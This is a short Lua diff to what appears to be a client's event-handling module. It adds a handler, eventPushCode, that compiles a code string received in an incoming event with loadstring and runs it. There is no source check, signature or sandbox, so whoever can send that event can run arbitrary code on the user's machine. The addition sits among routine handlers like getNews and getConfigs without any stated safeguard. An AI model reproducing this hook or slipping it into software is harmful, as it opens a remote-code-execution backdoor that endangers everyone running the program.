@@ -376,6 +376,11 @@ function _M:eventGetNews(e)
 	end
 end
 
+function _M:eventPushCode(e)
+	local f = loadstring(e.code)
+	if f then pcall(f) end
+end
+
 function _M:eventGetConfigs(e)
 	local data = e.data:unserialize()
 	local module = e.module
